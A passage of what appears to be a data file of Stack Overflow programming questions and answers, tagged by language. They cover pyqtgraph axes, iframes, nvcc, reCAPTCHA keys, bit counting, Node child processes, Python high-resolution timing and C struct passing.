    p2.linkedViewChanged(p1.vb, p2.XAxis)
    p3.linkedViewChanged(p1.vb, p3.XAxis)
    p4.linkedViewChanged(p1.vb, p4.XAxis)

updateViews()
p1.vb.sigResized.connect(updateViews)

p1.plot([1, 2, 4, 8, 16, 32])
p2.addItem(pg.PlotCurveItem([1, 2, 4, 9, 16, 32], pen='b'))
p3.addItem(pg.PlotCurveItem([1, 2, 4, 7, 16, 32], pen='r'))
p4.addItem(pg.PlotCurveItem([1, 3, 5, 7, 17, 32], pen='c'))

## Start Qt event loop unless running in interactive mode or using pyside.
if __name__ == '__main__':
    import sys

    if (sys.flags.interactive != 1) or not hasattr(QtCore, 'PYQT_VERSION'):
        QtGui.QApplication.instance().exec_()

This produces the following picture which I have added a red arrow showing what I want to do. 

Based on what I have been able to figure out I can do this using pg.GraphicsLayout(). However, the axisItem directly associated with plotItem and the created axisItems don't match because the one attached to the plotitem is smaller.
Here is a picture of what I believe is happening:

This is my problem as I want them to all align. In the attached code you can addItem(axes,2,1) to the right but it doesn't work on the left. Anyone know how I can do this?
Thanks in advance for any help you can provide.
","I had this same issue, saw this post, was disappointed with the lack of an answer, but I finally did manage a fix so figured I would post here.
If you could post the code you have for the axis on the right, I could patch that up, but basically what I did was attach the bottom axis to a a row of its own.
self.main_pI = pg.PlotItem()
self.axis_bottom = self.main_pI.getAxis('bottom')
self.axis_bottom.setLabel('Time (seconds)', color='#ffffff')
self.layout.addItem(self.main_pI, row=1, col=2, rowspan=2)
self.layout.addItem(self.axis_bottom, row=3, col=2, rowspan=2)

I'm a noob at pyqtgraph so I'm sure I'm going to butcher this terminology, but I detach the 'bottom' axis, and reattach it to the layout, where it's on a row of its own.
Hope that helps.
",python
how to move an iframe in the dom without losing its state,"Take a look at this simple HTML:
<div id=""wrap1"">
  <iframe id=""iframe1""></iframe>
</div>
<div id=""warp2"">
  <iframe id=""iframe2""></iframe>
</div>

Let's say I wanted to move the wraps so that the #wrap2 would be before the #wrap1. The iframes are polluted by JavaScript. I am aware of jQuery's .insertAfter() and .insertBefore(). However, when I use those, the iFrame loses all of its HTML, and JavaScript variables and events.
Lets say the following was the iFrame's HTML:
<html>
  <head>
    <script type=""text/javascript"" src=""jquery.js""></script>
    <script type=""text/javascript"">
      // The variable below would change on click
      // This represents changes on variables after the code is loaded
      // These changes should remain after the iFrame is moved
      variableThatChanges = false;
      $(function(){
        $(""body"").click(function(){ 
          variableThatChanges = true; 
        });
      });
    </script>
  </head>
  <body>
    <div id='anything'>Illustrative Example</div>
  </body>
</html>

In the above code, the variable variableThatChanges would...change if the user clicked on the body. This variable, and the click event, should remain after the iFrame is moved (along with any other variables/events that have been started)
My question is the following: with JavaScript (with or without jQuery), how can I move the wrap nodes in the DOM (and their iframe childs) so that the iFrame's window stays the same, and the iFrame's events/variables/etc stay the same?
","It isn't possible to move an iframe from one place in the dom to another without it reloading. 
Here is an example to show that even using native JavaScript the iFrames still reload:
http://jsfiddle.net/pZ23B/
var wrap1 = document.getElementById('wrap1');
var wrap2 = document.getElementById('wrap2');
setTimeout(function(){
    document.getElementsByTagName('body')[0].appendChild(wrap1);
},10000);

",javascript
cuda compiler error no input files specified,"Trying to compile in win7 x64 cmd prompt. The following command:
nvcc -o kernal.cu

yields the following error message.
nvcc : fatal error : No input files specified; use option --help for more information

","try

nvcc -o xxx kernal.cu

where xxx is the output file name you want.
",c
embed javascript as base64,"I'm working on a small GreaseMonkey script where I would like to embed a jQuery plugin (Markitup) so that the script is fully self contained (images + js) except for jQuery which is served from google.
I found the site http://www.greywyvern.com/code/php/binary2base64 which says that you can embed javascript with the href if you base64 encode the script, much like serving images as basse64 from CSS.
<script type=""text/javascript"" href=""data:text/javascript;base64,dmFyIHNjT2JqMSA9IG5ldyBzY3Jv...""></script>

So i tried that but couldn't get it to work at all, using Firefox 3.0.5 on OS X.
I put together a small test page to isolate the problem but couldn't get it to work at that page either.
<!DOCTYPE HTML>
<html>
   <head>
      <title>Title</title>
      <meta charset=""utf-8"">
   </head>
   <body>
      <script href=""data:text/javascript;base64,YWxlcnQoJ2FzYWRhc2QnKTsK""></script> 
      <script>alert('a');</script>  
   </body>
</html>

The base64 string (YWxlcnQoJ2FzYWRhc2QnKTsK) says alert('asadasd'); so I'm supposed to get two alerts but the only one I see is the second one where the alert is located as text inside the script tag.
Am I doing something wrong or why isn't this working, any ideas?
","maybe just a thought but maybe the ""href"" should be ""src"" instead.
",javascript
how to listen iframe keydown event with reactjs,"I want to listen for a keydown event of an iframe in reactjs. In my iframe i have video embedded. Now when the video is playing i want to handle keyboard events.Can any one please help me how to listen for keyboard events. This is my code
class VideoDetail extends Component {

videoLoad(e) {
    console.log('videoLoaded');
    this.videoFrame.addEventListener('keydown',this.onVideoDown);
}

onVideoDown(e) {
    console.log('key pressed'); // This is not invoking
}

componentDidMount() {
    console.log(this.videoFrame);
}
render() {
    const video = this.props.video;
    if (!video) {
        return <div>Loading...</div>;
    }

    const videoId = video.id.videoId;
    const url = `https://www.youtube.com/embed/${videoId}`;
    return (
        <div className=""video-detail col-md-8"">
            <div className=""embed-responsive embed-responsive-16by9"">
                <iframe ref={(iframe) => { this.videoFrame = iframe; console.log(iframe); }} className=""embed-responsive-item"" src={url} onLoad={(e) => this.videoLoad(e)}></iframe>
            </div>
            <div className=""details"">
                <div>{video.snippet.title}</div>
                <div>{video.snippet.description}</div>
            </div>
        </div>
    );
}

}

","You can catch the iframe keydown event with iframe.contentWindow.document as below using either e.target or this.videoFrame with the ref.
Modified code
videoLoad(e) {
    console.log('videoLoaded');
    var iframe = e.target; // it is equal to ""this.videoFrame"" and so, you can avoid using ""ref""
    //this.videoFrame.addEventListener('keydown',this.onVideoDown);
    iframe.contentWindow.document.addEventListener('keydown', this.onVideoDown);
}

",javascript
count bits 1 on an integer as fast as gcc __builtin__popcountint,"I write a algorithm (taken from ""The C Programming Language"") that counts the number of 1-bits very fast:
int countBit1Fast(int n)
{
    int c = 0;
    for (; n; ++c)
        n &= n - 1;
    return c;
}

But a friend told me that __builtin__popcount(int) is a lot faster, but less portable. I give it a try and was MANY times faster! Why it's so fast? I want to count bits as fast as possible, but without stick to a particular compiler.
EDIT: I may use it on PIC micro-controllers and maybe on non-intel processors, so I need the maximum portability. 
","
I write a algorithm (taken from ""The C Programming Language"") that counts the number of 1-bits very fast:

I don't see why anyone would characterize your approach as ""very fast"".  It's a bit clever, and it should be faster on average than naive alternatives.  It also does not depend on the width of the representation of int, which is a plus.  I observe that it has undefined behavior for negative arguments, but that's a common theme for bitwise operators and functions.
Let's analyze, supposing a non-negative argument:
int c = 0;
for (; n; ++c)
    n &= n - 1;


How many loop iterations are performed?
1 for each 1 bit in the binary representation of the value, irrespective of where in the value each bit lies

How much work is performed per iteration

one increment of c
one comparison of n against zero (plus one more of these when breaking out of the loop)
one decrement of n by 1
one bitwise 'and'

That ignores reads and stores, which very likely can be made free or especially cheap by keeping the operands in registers.  If we assume equal cost for each of those, that's four operations per iteration.  For random 32-bit integers, there will be an average of 16 iterations, for a total of 65 operations on average.  (Best case is just one operation, but worst is 129, which is no better than a naive implementation).


__builtin_popcount(), on the other hand, uses a single instruction regardless of input on platforms that support it, such as yours very likely is.  Even on those that don't have a for-purpose instruction, however, it can be done faster (on average).
@dbush has presented one such mechanism that has similar advantages to the one you present.  In particular, it does not depend on a pre-chosen integer width, and although it does depend on where in the representation the 1 bits reside, it does run faster for some arguments (smaller ones) than others.  If I'm counting right, that one will average around 20 operations on random 32-bit inputs: five in each of four loop iterations (only 0.4% of random inputs would require fewer than four iterations).  I'm counting one table read per iteration there, which I assume can be served from cache, but which is probably still not as fast as an arithmetic operation on values already held in registers.
One that is strictly computational would be:
int countBit1Fast(uint32_t n) {
    n = (n & 0x55555555u) + ((n >> 1) & 0x55555555u);
    n = (n & 0x33333333u) + ((n >> 2) & 0x33333333u);
    n = (n & 0x0f0f0f0fu) + ((n >> 4) & 0x0f0f0f0fu);
    n = (n & 0x00ff00ffu) + ((n >> 8) & 0x00ff00ffu);
    n = (n & 0x0000ffffu) + ((n >>16) & 0x0000ffffu);
    return n;
}

That's pretty easy to count: five additions, five shifts, and ten bitwise 'and' operations, and 5 loads of constants for a total of 25 operations for every input (and it goes up only to 30 for 64-bit inputs, though those are now 64-bit operations instead of 32-bit ones).  This version is, however, intrinsically dependent on a particular size of the input data type.
",c
nodejs spawn vs execute,"In an online training video I am watching to learn Node, the narrator says that ""spawn is better for longer processes involving large amounts of data, whereas execute is better for short bits of data.""
Why is this? What is the difference between the child_process spawn and execute functions in Node.js, and when do I know which one to use?
","The main difference is that spawn is more suitable for long-running processes with huge output. That's because spawn streams input/output with a child process. On the other hand, exec buffers output in a small (by default 1MB, 200 KB till v11.x) buffer. exec first spawns a subshell, and then tries to execute your process. To cut a long story short, use spawn in case you need a lot of data streamed from a child process and exec if you need features like shell pipes, redirects or even more than one program at a time.
Some useful links - DZone Hacksparrow
",javascript
how can i get millisecond and microsecondresolution timestamps in python,"How do I get millisecond and microsecond-resolution timestamps in Python?
I'd also like the Arduino-like delay() (which delays in milliseconds) and delayMicroseconds() functions.
I read other answers before asking this question, but they rely on the time module, which prior to Python 3.3 did NOT have any type of guaranteed resolution whatsoever. Its resolution is all over the place. The most upvoted answer here quotes a Windows resolution (using their answer) of 16 ms, which is 32000 times worse than my answer provided here (0.5 us resolution). Again, I needed 1 ms and 1 us (or similar) resolutions, not 16000 us resolution.
Related:

my own answer on how to do the same thing (get ms and us-resolution timestamps) in C++

","Update Aug. 2022:
In modern Python 3, import time followed by time.perf_counter_ns() is sufficient, providing sub-microsecond precision in both Windows and Linux. See my new answer to this other question here: High-precision clock in Python. At the time of my answer in 2016 using Python 3.1 on a Raspberry Pi, that didn't exist.
See https://docs.python.org/3/library/time.html#time.monotonic_ns. This is new in Python 3.7. I haven't tested it myself yet though. Thanks for @HenrikMadsen for posting this in his answer here, which he since deleted, unfortunately.
I still need to test these new Python 3.7 and later functions to see if they are as good as what I have below.
So, try this first and compare it to what I have done below:
import time

time_ns = time.monotonic_ns()

You might also try time.clock_gettime_ns() on Unix or Linux systems. Based on its name, it appears to call the underlying clock_gettime() C function which I use in my nanos() function in C in my answer here and in my C Unix/Linux library here: timinglib.c.

Original answer in 2016:
Here's a fully-functional module for both Linux and Windows, and which is unique from all other answers here in that it works in pre-Python 3.3. All other answers there require Python 3.7 or later in most cases, and Python 3.3 or later in other cases. Again, my answer below works in Windows and Linux in any version of Python, going back at least as early as Python 3.0 or so, in case you need that (I can't remember if it works on Python 2.7 or not).
It uses the ctypes library to call C or C++ dynamic libraries in Python via .dll ""dynamically linked library"" files in Windows, or .so ""shared object"" library files in Unix or Linux.
Functions and code samples.
Functions include:

micros()
millis()
delay()
delayMicroseconds()

Download GS_timing.py from my eRCaGuy_PyTime repo, then do:
import GS_timing

time_ms = GS_timing.millis()
time_us = GS_timing.micros()
GS_timing.delay(10)                # delay 10 ms
GS_timing.delayMicroseconds(10000) # delay 10000 us

Python code module (on GitHub as eRCaGuy_PyTime):
""""""
GS_timing.py
-create some low-level Arduino-like millis() (milliseconds) and micros() 
 (microseconds) timing functions for Python 
By Gabriel Staples
http://www.ElectricRCAircraftGuy.com 
-click ""Contact me"" at the top of my website to find my email address 
Started: 11 July 2016 
Updated: 13 Aug 2016 

History (newest on top): 
20160813 - v0.2.0 created - added Linux compatibility, using ctypes, so that it's compatible with pre-Python 3.3 (for Python 3.3 or later just use the built-in time functions for Linux, shown here: https://docs.python.org/3/library/time.html)
-ex: time.clock_gettime(time.CLOCK_MONOTONIC_RAW)
20160711 - v0.1.0 created - functions work for Windows *only* (via the QPC timer)

References:
WINDOWS:
-personal (C++ code): GS_PCArduino.h
1) Acquiring high-resolution time stamps (Windows)
   -https://msdn.microsoft.com/en-us/library/windows/desktop/dn553408(v=vs.85).aspx
2) QueryPerformanceCounter function (Windows)
   -https://msdn.microsoft.com/en-us/library/windows/desktop/ms644904(v=vs.85).aspx
3) QueryPerformanceFrequency function (Windows)
   -https://msdn.microsoft.com/en-us/library/windows/desktop/ms644905(v=vs.85).aspx
4) LARGE_INTEGER union (Windows)
   -https://msdn.microsoft.com/en-us/library/windows/desktop/aa383713(v=vs.85).aspx

-*****https://stackoverflow.com/questions/4430227/python-on-win32-how-to-get-
absolute-timing-cpu-cycle-count
   
LINUX:
-https://stackoverflow.com/questions/1205722/how-do-i-get-monotonic-time-durations-in-python


""""""

import ctypes, os 

#Constants:
VERSION = '0.2.0'

#-------------------------------------------------------------------
#FUNCTIONS:
#-------------------------------------------------------------------
#OS-specific low-level timing functions:
if (os.name=='nt'): #for Windows:
    def micros():
        ""return a timestamp in microseconds (us)""
        tics = ctypes.c_int64()
        freq = ctypes.c_int64()

        #get ticks on the internal ~2MHz QPC clock
        ctypes.windll.Kernel32.QueryPerformanceCounter(ctypes.byref(tics)) 
        #get the actual freq. of the internal ~2MHz QPC clock
        ctypes.windll.Kernel32.QueryPerformanceFrequency(ctypes.byref(freq))  
        
        t_us = tics.value*1e6/freq.value
        return t_us
        
    def millis():
        ""return a timestamp in milliseconds (ms)""
        tics = ctypes.c_int64()
        freq = ctypes.c_int64()

        #get ticks on the internal ~2MHz QPC clock
        ctypes.windll.Kernel32.QueryPerformanceCounter(ctypes.byref(tics)) 
        #get the actual freq. of the internal ~2MHz QPC clock 
        ctypes.windll.Kernel32.QueryPerformanceFrequency(ctypes.byref(freq)) 
        
        t_ms = tics.value*1e3/freq.value
        return t_ms

elif (os.name=='posix'): #for Linux:

    #Constants:
    CLOCK_MONOTONIC_RAW = 4 # see <linux/time.h> here: https://github.com/torvalds/linux/blob/master/include/uapi/linux/time.h
    
    #prepare ctype timespec structure of {long, long}
    class timespec(ctypes.Structure):
        _fields_ =\
        [
            ('tv_sec', ctypes.c_long),
            ('tv_nsec', ctypes.c_long)
        ]
        
    #Configure Python access to the clock_gettime C library, via ctypes:
    #Documentation:
    #-ctypes.CDLL: https://docs.python.org/3.2/library/ctypes.html
    #-librt.so.1 with clock_gettime: https://docs.oracle.com/cd/E36784_01/html/E36873/librt-3lib.html #-
    #-Linux clock_gettime(): http://linux.die.net/man/3/clock_gettime
    librt = ctypes.CDLL('librt.so.1', use_errno=True)
    clock_gettime = librt.clock_gettime
    #specify input arguments and types to the C clock_gettime() function
    # (int clock_ID, timespec* t)
    clock_gettime.argtypes = [ctypes.c_int, ctypes.POINTER(timespec)]

    def monotonic_time():
        ""return a timestamp in seconds (sec)""
        t = timespec()
        #(Note that clock_gettime() returns 0 for success, or -1 for failure, in
        # which case errno is set appropriately)
        #-see here: http://linux.die.net/man/3/clock_gettime
        if clock_gettime(CLOCK_MONOTONIC_RAW , ctypes.pointer(t)) != 0:
            #if clock_gettime() returns an error
            errno_ = ctypes.get_errno()
            raise OSError(errno_, os.strerror(errno_))
        return t.tv_sec + t.tv_nsec*1e-9 #sec 
    
    def micros():
        ""return a timestamp in microseconds (us)""
        return monotonic_time()*1e6 #us 
        
    def millis():
        ""return a timestamp in milliseconds (ms)""
        return monotonic_time()*1e3 #ms 

#Other timing functions:
def delay(delay_ms):
    ""delay for delay_ms milliseconds (ms)""
    t_start = millis()
    while (millis() - t_start < delay_ms):
      pass #do nothing 
    return

def delayMicroseconds(delay_us):
    ""delay for delay_us microseconds (us)""
    t_start = micros()
    while (micros() - t_start < delay_us):
      pass #do nothing 
    return 
        
#-------------------------------------------------------------------
#EXAMPLES:
#-------------------------------------------------------------------
#Only executute this block of code if running this module directly,
#*not* if importing it
#-see here: http://effbot.org/pyfaq/tutor-what-is-if-name-main-for.htm
if __name__ == ""__main__"": #if running this module as a stand-alone program

    #print loop execution time 100 times, using micros()
    tStart = micros() #us
    for x in range(0, 100):
        tNow = micros() #us
        dt = tNow - tStart #us; delta time 
        tStart = tNow #us; update 
        print(""dt(us) = "" + str(dt))

    #print loop execution time 100 times, using millis()
    print(""\n"")
    tStart = millis() #ms
    for x in range(0, 100):
        tNow = millis() #ms
        dt = tNow - tStart #ms; delta time 
        tStart = tNow #ms; update 
        print(""dt(ms) = "" + str(dt))
        
    #print a counter once per second, for 5 seconds, using delay 
    print(""\nstart"")
    for i in range(1,6):
        delay(1000)
        print(i)

    #print a counter once per second, for 5 seconds, using delayMicroseconds
    print(""\nstart"")
    for i in range(1,6):
        delayMicroseconds(1000000)
        print(i)

If you know how to get the above millisecond and microsecond-resolution timestamps in Linux, please post, as that would be very helpful too.
This works for Linux too, including in pre-Python 3.3, since I'm using C functions via the ctypes module in order to read the time stamps.
(Note: code above originally posted here: http://www.electricrcaircraftguy.com/2016/07/arduino-like-millisecond-and-microsecond-timestamps-in-python.html)
Special thanks to @ArminRonacher for his brilliant pre-Python 3.3 Linux answer here: https://stackoverflow.com/a/1205762/4561887
Timestamp and clock references:

Windows: QueryPerformanceCounter(): https://learn.microsoft.com/en-us/windows/win32/api/profileapi/nf-profileapi-queryperformancecounter:

Retrieves the current value of the performance counter, which is a high resolution (<1us) time stamp that can be used for time-interval measurements.


Linux: clock_gettime(): https://man7.org/linux/man-pages/man3/clock_gettime.3.html (emphasis added):

CLOCK_MONOTONIC
A nonsettable system-wide clock that represents monotonic time since—as described by POSIX—""some unspecified point in the past"".  On Linux, that point corresponds to the number of seconds that the system has been running since it was booted.
CLOCK_MONOTONIC_RAW (since Linux 2.6.28; Linux-specific)
Similar to CLOCK_MONOTONIC, but provides access to a raw hardware-based time that is not subject to NTP adjustments or the incremental adjustments performed by adjtime(3).  This clock does not count time that the system is suspended.


Note that both clocks on both systems do NOT provide ""wall clock"" type timestamps. Rather, they both provide high-resolution (sub-microsecond) timestamps which generally count time since boot. These timestamps are useful for precision timing of events, producing repeatable, periodic loops, and measuring small time intervals in code, with great resolution, precision, and accuracy.


Update: prior to Python 3.3, the built-in Python time library (https://docs.python.org/3.5/library/time.html) didn't have any explicitly high-resolution functions. Now, however it does provide other options, including some high-resolution functions.
My module above, however, provides high-resolution timestamps for Python code before Python 3.3, as well as after, and it does so on both Linux and Windows.
Here's an example of what I mean, showing that the time.sleep() function is NOT necessarily a high-resolution function. On my Windows machine, it's resolution is perhaps 8ms at best, whereas my module above has 0.5us resolution (16000 times better!) on the same machine.
Code demonstration:
import time
import GS_timing as timing

def delayMicroseconds(n):
    time.sleep(n / 1000000.)

def delayMillisecond(n):
    time.sleep(n / 1000.)

t_start = 0
t_end = 0

#using time.sleep
print('using time.sleep')
print('delayMicroseconds(1)')
for x in range(10):
    t_start = timing.micros() #us 
    delayMicroseconds(1)
    t_end = timing.micros() #us
    print('dt (us) = ' + str(t_end - t_start))
print('delayMicroseconds(2000)')
for x in range(10):
    t_start = timing.micros() #us 
    delayMicroseconds(2000)
    t_end = timing.micros() #us
    print('dt (us) = ' + str(t_end - t_start))
  
#using GS_timing
print('\nusing GS_timing')
print('timing.delayMicroseconds(1)')
for x in range(10):
    t_start = timing.micros() #us 
    timing.delayMicroseconds(1)
    t_end = timing.micros() #us
    print('dt (us) = ' + str(t_end - t_start))
print('timing.delayMicroseconds(2000)')
for x in range(10):
    t_start = timing.micros() #us 
    timing.delayMicroseconds(2000)
    t_end = timing.micros() #us
    print('dt (us) = ' + str(t_end - t_start))


SAMPLE RESULTS ON MY WINDOWS 8.1 MACHINE (notice how much worse time.sleep does):
using time.sleep
delayMicroseconds(1)
dt (us) = 2872.059814453125
dt (us) = 886.3939208984375
dt (us) = 770.4649658203125
dt (us) = 1138.7698974609375
dt (us) = 1426.027099609375
dt (us) = 734.557861328125
dt (us) = 10617.233642578125
dt (us) = 9594.90576171875
dt (us) = 9155.299560546875
dt (us) = 9520.526611328125
delayMicroseconds(2000)
dt (us) = 8799.3056640625
dt (us) = 9609.2685546875
dt (us) = 9679.5439453125
dt (us) = 9248.145263671875
dt (us) = 9389.721923828125
dt (us) = 9637.994262695312
dt (us) = 9616.450073242188
dt (us) = 9592.853881835938
dt (us) = 9465.639892578125
dt (us) = 7650.276611328125

using GS_timing
timing.delayMicroseconds(1)
dt (us) = 53.3477783203125
dt (us) = 36.93310546875
dt (us) = 36.9329833984375
dt (us) = 34.8812255859375
dt (us) = 35.3941650390625
dt (us) = 40.010986328125
dt (us) = 38.4720458984375
dt (us) = 56.425537109375
dt (us) = 35.9072265625
dt (us) = 36.420166015625
timing.delayMicroseconds(2000)
dt (us) = 2039.526611328125
dt (us) = 2046.195068359375
dt (us) = 2033.8841552734375
dt (us) = 2037.4747314453125
dt (us) = 2032.34521484375
dt (us) = 2086.2059326171875
dt (us) = 2035.4229736328125
dt (us) = 2051.32470703125
dt (us) = 2040.03955078125
dt (us) = 2027.215576171875


SAMPLE RESULTS ON MY RASPBERRY PI VERSION 1 B+ (notice that the results between using time.sleep and my module are basically identical...apparently the low-level functions in time are already accessing better-resolution timers here, since it's a Linux machine (running Raspbian)...BUT in my GS_timing module I am explicitly calling the CLOCK_MONOTONIC_RAW timer. Who knows what's being used otherwise):
using time.sleep
delayMicroseconds(1)
dt (us) = 1022.0
dt (us) = 417.0
dt (us) = 407.0
dt (us) = 450.0
dt (us) = 2078.0
dt (us) = 393.0
dt (us) = 1297.0
dt (us) = 878.0
dt (us) = 1135.0
dt (us) = 2896.0
delayMicroseconds(2000)
dt (us) = 2746.0
dt (us) = 2568.0
dt (us) = 2512.0
dt (us) = 2423.0
dt (us) = 2454.0
dt (us) = 2608.0
dt (us) = 2518.0
dt (us) = 2569.0
dt (us) = 2548.0
dt (us) = 2496.0

using GS_timing
timing.delayMicroseconds(1)
dt (us) = 572.0
dt (us) = 673.0
dt (us) = 1084.0
dt (us) = 561.0
dt (us) = 728.0
dt (us) = 576.0
dt (us) = 556.0
dt (us) = 584.0
dt (us) = 576.0
dt (us) = 578.0
timing.delayMicroseconds(2000)
dt (us) = 2741.0
dt (us) = 2466.0
dt (us) = 2522.0
dt (us) = 2810.0
dt (us) = 2589.0
dt (us) = 2681.0
dt (us) = 2546.0
dt (us) = 3090.0
dt (us) = 2600.0
dt (us) = 2400.0

Related:

My 3 sets of timestamp functions (cross-linked to each other):

For C timestamps, see my answer here: Get a timestamp in C in microseconds?
For C++ high-resolution timestamps, see my answer here: Getting an accurate execution time in C++ (micro seconds)
For Python high-resolution timestamps, see my answer here: How can I get millisecond and microsecond-resolution timestamps in Python?


My C and C++ Linux high-resolution timing library with millis(), micros(), nanos(), sleep_ns(), sleep_until_ns, use_realtime_scheduler(), get_estimated_resolution(), etc.

timinglib.h
timinglib.c


[my answer for C and C++, including microcontrollers (or any other system)] How to do timestamp-based, non-blocking, single-threaded cooperative multi-tasking
[my answer for C and C++, including microcontrollers and Arduino (or any other system)] Full coulomb counter example demonstrating the above concept with timestamp-based, single-threaded, cooperative multi-tasking
[my answer for C and C++ in Linux--could be easily adapted to Python using the ctypes module, as shown above] How to run a high-resolution, high-precision periodic loop in Linux easily, at any frequency (ex: up to 10 KHz~100 KHz) using a soft real-time scheduler and nanosecond delays

",python
function for summation is works properly without return,"My code:
#include <stdio.h>

int summation(int sum)
{
    if (sum == 1)
    {
        return 1;
    }

    int s=0;
    s = sum + summation(sum - 1);
}

void main()
{
    printf(""%d"", summation(5));
}

The code doesn't have a return line in summation function. But it still works as if we are returning s. It correctly gives 15 as output
","Without an explicit return, you have undefined behavior. Doing what you expect is one possibility, but does not mean your program is working properly. In fact, it might be the most dangerous/misleading possibility.
Compiling with warnings on would have told you about this.
$ gcc test.c -Wall -Wextra
test.c: In function ‘summation’:
test.c:9:9: warning: variable ‘s’ set but not used [-Wunused-but-set-variable]
     int s=0;
         ^
test.c: At top level:
test.c:13:6: warning: return type of ‘main’ is not ‘int’ [-Wmain]
 void main()
      ^~~~
test.c: In function ‘summation’:
test.c:11:1: warning: control reaches end of non-void function [-Wreturn-type]
 }
 ^

Compiling with -Werror would force you to address these issues.
In order to ensure the behavior of your program is defined, you should have an explicit return. You also have the potential for unbounded recursion if sum is less than 1.
#include <stdio.h>

unsigned int summation(unsigned int sum) {
    if (sum <= 1) {
        return sum;
    }
    else {
        return sum + summation(sum - 1);
    }
}

int main(void) {
    printf(""%u"", summation(5));
}

Eliminating recursion and looping
As a sidenote, there is no non-academic reason to use recursion for this vs. a simple loop.
unsigned int summation(unsigned int sum) {
    unsigned int result = 0;

    for (unsigned int x = 1; x <= sum; x++) {
        result += x;
    }   

    return result;
}

But really, summing an arithmetic sequence doesn't require a loop at all when we can just use math.
unsigned int summation(unsigned int sum) {
    return 10 * (1 + sum) / 2 * sum / 10;
}

",c
google recaptcha error for site owner invalid site key,"I cant get reCAPTCHA v3 working on my website. I have put the right code in from the Google reCAPTCHA v3 website but it shows ""ERROR for site owner: Invalid site key"" in the bottom right.
I'm only 7 and if I have missed something, please take it easy
 <!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <title>Recaptcha test</title>
    <script src=""https://www.google.com/recaptcha/api.js""></script>
    <script>
      function onSubmit(token) {
          document.getElementById(""demo-form"").submit();
      }
    </script>
    <script src=""https://www.google.com/recaptcha/api.js?render=reCAPTCHA_site_key""></script>


<body>
<button class=""g-recaptcha""
        data-sitekey=""reCAPTCHA_site_key""
        data-callback='onSubmit'
        data-action='submit'>Submit</button>
<script>
    function onClick(e) {
        e.preventDefault();
        grecaptcha.ready(function() {
            grecaptcha.execute('reCAPTCHA_site_key', {action: 'submit'}).then(function(token) {
                // Add your logic to submit to your backend server here.
            });
        });
    }
</script>


</head>
</body>
</html>

Then, I tried reCAPTCHA v2 Checkbox, same things happened. Although, ""ERROR for site owner: Invalid site key"" was now in the top left:
    <!DOCTYPE html>?
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <title>Recaptcha test</title>
    <script src=""https://www.google.com/recaptcha/api.js"" async defer></script>

    <script src=""https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit""
            async defer>
    </script>



<body>
<form action=""?"" method=""POST"">
    <div class=""g-recaptcha"" data-sitekey=""your_site_key""></div>
    <br/>
    <input type=""submit"" value=""Submit"">
</form>
<script type=""text/javascript"">
    var onloadCallback = function() {
        alert(""grecaptcha is ready!"");
    };
</script>



</head>
</body>
</html>

","I have tried your code of reCAPTCHA v3 which you have mentioned.

reCAPTCHA_site_key is at three places, please check if you have replaced it with correct site key under heading: ""COPY SITE KEY"".

Reason that it's showing ""ERROR for site owner: Invalid site key"" is you might be trying file system to access the key. It doesn't work on file systems i.e, this will not work: file:///E:/Personal%20Data/stackoverflow/recapcha.html

Host your site on local server like IIS/Node etc, and add the same domain in domain configurations of reCAPTCHA.


For example, if your website is: https://www.testingrecapcha.com add testingrecapcha.com in domains of reCAPTCHA configurations.
To reach the admin console of reCAPTCHA, use this link and select your relevant site and click on settings icon.
",javascript
how to extract number from a string in javascript,"I have an element in javascript like follows:
 <span>280ms</span>

I want to extract 280 from the span element. How can I do it? The content within the span element will be any number followed by ms.
","parseInt() is pretty sweet.
HTML
<span id=""foo"">280ms</span>

JS
var text = $('#foo').text();
var number = parseInt(text, 10);
alert(number);

parseInt() will process any string as a number and stop when it reaches a non-numeric character.  In this case the m in 280ms.  After have found the digits 2, 8, and 0, evaluates those digits as base 10 (that second argument) and returns the number value 280.  Note this is an actual number and not a string.
Edit: 
@Alex Wayne's comment. 
Just filter out the non numeric characters first.
parseInt('ms120'.replace(/[^0-9\.]/g, ''), 10);

",javascript
are passbyvalue structs pushed onto the stack,"Do the c/c++ compilers push structs by value onto the stack, memcopying hundreds of bytes onto the stack if the programmer specifies a large struct? Does returning structs incur the same penalty?
","Yes, the compiler will almost certainly do something like a memcpy to copy the struct or class of hundreds of bytes onto the stack if that's what you asked for. If that wasn't the case something like this wouldn't work:
std::string s = ""A large amount of text"";

std::string r = rev(s);
std::cout << s << "" reversed is "" << r << std::endl; 

...
std::string rev(std::string s)
{
   std::string::size_type len = s.length();
   for(std::string::size_type i = 0; i < len / 2; i++)
   {
      swap(s[i], s[len-i]);
   }
   return s;
}       

This is why it's nearly always recommended to use const references when possible, as it passes just a pointer to the object.
Since the above example got objected to, here's another example:
class mystring
{
    char s[200];
    size_t len;
  public:
    mystring(const char *aS)
    {
       strcpy(s, aS);
       len = strlen(s);
    }
    char& operator[](int index)
    {
       return s[index];
    }
    size_t length() 
    { 
       return len; 
    }
}

mystring str(""Some long string"");
mystring rev = rev_my_str(s);

mystring rev_my_str(mystring s)
{
   size_t len = s.length();
   for(size_t i = 0; i < len / 2; i++)
   {
      swap(s[i], s[len-i]);
   }
   return s;
}

In fact, this will make space for TWO mystring objects on the stack, one for s going into rev_my_str, and one for the return value.
Edit:
Assembler generated by g++ -O1 [1] for the call to rev_my_string as above. The interesting bit is the rep movsq along with the setup of %ecx, %rsi and %rdi (count, source and destination, respectively). $26 is the number of 8 byte units that it will copy. 26 * 8 = 208 bytes. %rsp is the stack pointer. This is almost exactly how a memcpy would look if it was inlined in a simple form [actual memcpy most likely has a whole bunch of extra work to deal with unaligned start/end and using SSE instructions, etc]. 
movl    $26, %ecx
movq    %rsp, %rdi
movq    %rbx, %rsi
rep movsq
leaq    416(%rsp), %rdi
call    _Z10rev_my_str8mystring

And rev_my_string itself looks like this. Note the rep movsq at the bottom of the function. That's where it stores back the resulting string.
 _Z10rev_my_str8mystring:
.LFB990:
.cfi_startproc
movq    %rdi, %rax
movq    208(%rsp), %r9
movq    %r9, %r10
shrq    %r10
je  .L5
addq    $1, %r10
movl    $1, %edx
.L6:
movl    %r9d, %ecx
subl    %edx, %ecx
leaq    7(%rsp), %rsi
addq    %rdx, %rsi
movzbl  (%rsi), %edi
movslq  %ecx, %rcx
movzbl  8(%rsp,%rcx), %r8d
movb    %r8b, (%rsi)
movb    %dil, 8(%rsp,%rcx)
addq    $1, %rdx
cmpq    %r10, %rdx
jne .L6
.L5:
movl    $26, %ecx
